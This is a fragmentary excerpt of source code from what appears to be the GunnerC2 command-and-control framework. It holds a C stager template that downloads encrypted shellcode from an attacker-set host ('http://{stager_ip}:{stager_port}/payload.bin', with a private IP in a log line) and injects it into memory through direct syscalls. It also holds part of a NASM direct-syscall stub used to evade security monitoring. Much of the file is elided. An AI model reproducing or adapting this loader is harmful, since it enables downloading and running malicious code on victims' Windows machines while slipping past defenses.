# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\payload_generator\windows\http\exe\source_files.py
...
int main() {{
	...
	PRINTA("[*] Fetching update from %s", "http://192.168.2.228:8000/payload.bin");
	if (!GetUpdate("http://{stager_ip}:{stager_port}/payload.bin", &enc_shellcode, &enc_shellcode_len)) {{
	#ifdef DEBUG
	...
	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, enc_shellcode, enc_shellcode_len, TRUE)) {{
	#ifdef DEBUG
...
BOOL GetUpdate(LPCSTR url, unsigned char** buffer, DWORD* bufSize)
{{
	HINTERNET hInet = InternetOpenA("GunnerC2", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
...
; src/HellAsm.asm — NASM Win64 syntax

; -- Data section ------------------------------------------------------------
section .data
    ; 32‑bit storage for your “TakeAllTrilliare” flag
    ; we’ll use a 64‑bit label but only write a DWORD
...
TheFlagOfWudan:
    ; Windows x64 syscalls expect the syscall number in EAX, RCX/...
    mov r10, rcx               ; preserve RCX in R10 (as per syscall convention)
